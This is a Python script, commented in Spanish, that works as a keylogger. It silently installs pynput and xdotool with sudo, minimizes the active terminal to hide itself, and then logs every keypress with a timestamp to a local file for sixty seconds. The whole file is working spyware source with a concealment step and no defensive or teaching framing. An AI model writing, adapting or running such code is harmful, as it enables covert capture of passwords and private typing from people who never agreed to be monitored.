import os
import subprocess
import time
from pynput import keyboard
from datetime import datetime

def install_dependencies():
    """Instala dependencias necesarias automáticamente."""
    try:
        # Instalar pip si no está disponible
        subprocess.run(["sudo", "apt-get", "install", "-y", "python3-pip"], check=True)
        # Instalar pynput
        subprocess.run(["pip3", "install", "--user", "pynput"], check=True)
        # Instalar xdotool
        subprocess.run(["sudo", "apt-get", "install", "-y", "xdotool"], check=True)
    except Exception as e:
        print(f"Error al instalar dependencias: {e}")

def minimize_terminal():
    """Minimiza la ventana de la terminal activa."""
    try:
        subprocess.run(["xdotool", "getactivewindow", "windowminimize"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass  # Ignora errores

def log_key(key):
    """Registra las teclas presionadas con la hora."""
    with open("keylogger_output.txt", "a") as log_file:
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        try:
            log_file.write(f"{timestamp} {key.char}\n")
        except AttributeError:
            log_file.write(f"{timestamp} {key}\n")

def main():
    minimize_terminal()  # Minimizar terminal
    with keyboard.Listener(on_press=log_key) as listener:
        time.sleep(60)  # Ejecutar durante 60 segundos
        listener.stop()

if __name__ == "__main__":
    install_dependencies()
    main()


